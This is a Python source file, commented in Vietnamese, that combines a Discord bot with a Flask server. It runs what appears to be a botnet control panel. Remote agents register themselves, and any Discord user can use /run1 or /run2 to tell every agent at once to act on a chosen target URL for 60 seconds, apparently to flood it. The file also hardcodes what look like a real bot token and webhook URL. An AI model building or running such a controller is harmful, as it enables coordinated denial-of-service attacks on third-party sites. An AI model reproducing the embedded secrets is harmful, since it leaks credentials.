import os
import json
import aiohttp
import asyncio
from flask import Flask, request, jsonify
import discord
from discord.ext import commands
import uuid
import requests
from threading import Thread
import re

# === CONFIG ===
TOKEN = "MTQxNzc5ODk2MjEzNTY5OTUyNg.GcXkLs.Mj_wZZhdi92qBJ11qpgaXoIhzHYI-ekcgRoHpM"
GUILD_ID = 1410915527991230476
OWNER_ID = 970327824915365949
AGENT_FILE = "agents.txt"
WEBHOOK_URL = "https://discord.com/api/webhooks/1424394508170432605/yxCAWri8WWPG-VnX2iux1zoZFup3NFTGRizxnv_1hLv9EQdwGZFqHrCUvlNci3sNOhOM"  # Thay bằng webhook của bạn

# === FLASK APP ===
app = Flask(__name__)
agents = {}
admins = set([OWNER_ID])

run_state = {
    "is_running": False,
    "user": None,
    "seconds_left": 0,
    "message": None,
    "task": None
}


# --- Helper ---
def load_agents():
    if not os.path.exists(AGENT_FILE):
        return {}
    agents = {}
    with open(AGENT_FILE, "r") as f:
        for line in f:
            url = line.strip()
            if url:
                agents[str(uuid.uuid4())] = url
    return agents


def save_agents():
    with open(AGENT_FILE, "w") as f:
        for _, url in agents.items():
            f.write(url + "\n")


def send_webhook(content):
    try:
        requests.post(WEBHOOK_URL, json={"content": content})
    except Exception as e:
        print(f"Webhook error: {e}")


# === FLASK ROUTES ===
@app.route("/register", methods=["POST"])
def register():
    data = request.json
    domain = data.get("domain")
    if not domain:
        return jsonify({"status": "error", "msg": "missing domain"}), 400
    aid = str(uuid.uuid4())
    agents[aid] = domain
    save_agents()
    send_webhook(f"🟢 **Agent mới đăng ký:** {domain}\nTổng số: {len(agents)}")
    return jsonify({"status": "ok"})


@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "alive"})


# === DISCORD BOT ===
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)


def is_owner(interaction):
    return interaction.user.id == OWNER_ID


def is_admin(interaction):
    return interaction.user.id == OWNER_ID or interaction.user.id in admins


@bot.event
async def on_ready():
    print(f"✅ Bot online: {bot.user}")
    try:
        await bot.tree.sync(guild=discord.Object(id=GUILD_ID))
        print("✅ Commands synced.")
    except Exception as e:
        print("Sync error:", e)


# --- Broadcast ---
async def broadcast(endpoint: str, params: dict = None):
    global agents
    results = []
    dead_agents = []

    async with aiohttp.ClientSession() as session:
        tasks = []
        for aid, domain in agents.items():
            url = f"{domain}{endpoint}"

            async def do_get(aid, domain, url):
                try:
                    async with session.get(url, params=params, timeout=6) as resp:
                        if resp.status == 200:
                            return f"{domain}: ✅ OK"
                        else:
                            dead_agents.append(domain)
                            return f"{domain}: ⚠️ HTTP {resp.status}"
                except Exception as e:
                    dead_agents.append(domain)
                    return f"{domain}: ❌ {e}"

            tasks.append(do_get(aid, domain, url))
        results = await asyncio.gather(*tasks)

    removed = []
    for da in set(dead_agents):
        for k, v in list(agents.items()):
            if v == da:
                agents.pop(k, None)
                removed.append(da)
    if removed:
        save_agents()
        send_webhook(f"🔴 **Agent die đã bị xóa:**\n" + "\n".join(removed) + f"\n🧾 Còn lại: {len(agents)}")

    return results


# === COMMANDS ===

# 👑 /add_admin (chỉ Owner)
@bot.tree.command(name="add_admin", description="Owner thêm admin mới", guild=discord.Object(id=GUILD_ID))
async def add_admin(interaction: discord.Interaction, user_id: str):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ Bạn không có quyền dùng lệnh này.", ephemeral=True)
        return
    try:
        admins.add(int(user_id))
        await interaction.response.send_message(f"✅ Đã thêm admin: `{user_id}`")
    except:
        await interaction.response.send_message("❌ ID không hợp lệ.", ephemeral=True)


# 🛡️ /add_agent (admin + owner)
@bot.tree.command(name="add_agent", description="Thêm agent thủ công", guild=discord.Object(id=GUILD_ID))
async def add_agent(interaction: discord.Interaction, url: str):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ Bạn không có quyền thêm agent.", ephemeral=True)
        return

    if not re.match(r"^https?://", url):
        await interaction.response.send_message("❌ URL phải bắt đầu bằng http:// hoặc https://", ephemeral=True)
        return

    agents[str(uuid.uuid4())] = url
    save_agents()
    send_webhook(f"🟢 **Agent mới được thêm thủ công:** {url}\nTổng số: {len(agents)}")
    await interaction.response.send_message(f"✅ Đã thêm agent: `{url}`")


# 🛡️ /agents (admin + owner)
@bot.tree.command(name="agents", description="Xem danh sách và trạng thái agents", guild=discord.Object(id=GUILD_ID))
async def agents_cmd(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ Bạn không có quyền.", ephemeral=True)
        return

    results = []
    for aid, domain in agents.items():
        try:
            r = requests.get(f"{domain}/ping", timeout=3)
            if r.status_code == 200:
                results.append(f"{domain} ✅ Alive")
            else:
                results.append(f"{domain} ⚠️ HTTP {r.status_code}")
        except:
            results.append(f"{domain} ❌ Dead")

    if not results:
        await interaction.response.send_message("Không có agent nào.", ephemeral=True)
    else:
        await interaction.response.send_message("\n".join(results))


# 👤 /run1 (mọi người)
@bot.tree.command(name="run1", description="Chạy ./run 1 <url>", guild=discord.Object(id=GUILD_ID))
async def run1(interaction: discord.Interaction, url: str):
    await handle_run(interaction, "/run1", url)


# 👤 /run2 (mọi người)
@bot.tree.command(name="run2", description="Chạy ./run 2 <url>", guild=discord.Object(id=GUILD_ID))
async def run2(interaction: discord.Interaction, url: str):
    await handle_run(interaction, "/run2", url)


# 👤 /stop (mọi người)
@bot.tree.command(name="stop", description="Dừng tất cả agents đang chạy", guild=discord.Object(id=GUILD_ID))
async def stop(interaction: discord.Interaction):
    results = await broadcast("/stop")
    await interaction.response.send_message("🛑 Đã gửi lệnh dừng:\n" + "\n".join(results))
    run_state.update({
        "is_running": False,
        "user": None,
        "seconds_left": 0,
        "message": None,
        "task": None
    })


# === CHỨC NĂNG CHẠY LỆNH ===
async def handle_run(interaction, endpoint, url):
    if not re.match(r"^https?://", url):
        await interaction.response.send_message("❌ URL phải bắt đầu bằng http:// hoặc https://", ephemeral=True)
        return

    if run_state["is_running"]:
        await interaction.response.send_message(
            f"❌ Đang có người chạy: **{run_state['user'].name}** "
            f"(còn {run_state['seconds_left']}s)", ephemeral=True
        )
        return

    run_state.update({
        "is_running": True,
        "user": interaction.user,
        "seconds_left": 60
    })

    results = await broadcast(endpoint, {"url": url})
    await interaction.response.defer()
    msg = await interaction.followup.send(
        f"🚀 Đang chạy lệnh trong **60s** bởi **{interaction.user.name}**\n" + "\n".join(results)
    )
    run_state["message"] = msg
    run_state["task"] = asyncio.create_task(countdown_and_stop())


async def countdown_and_stop():
    while run_state["seconds_left"] > 0:
        if run_state["message"]:
            try:
                await run_state["message"].edit(
                    content=f"⏳ Còn lại {run_state['seconds_left']}s... (người chạy: **{run_state['user'].name}**)"
                )
            except:
                pass
        await asyncio.sleep(1)
        run_state["seconds_left"] -= 1

    await broadcast("/stop")
    if run_state["message"]:
        try:
            await run_state["message"].edit(content="⏹ Phiên đã kết thúc. Tất cả agents đã dừng.")
        except:
            pass
    run_state.update({
        "is_running": False,
        "user": None,
        "seconds_left": 0,
        "message": None,
        "task": None
    })


# === MAIN ===
if __name__ == "__main__":
    def run_flask():
        app.run(host="0.0.0.0", port=8080)

    agents = load_agents()
    Thread(target=run_flask, daemon=True).start()
    asyncio.run(bot.start(TOKEN))
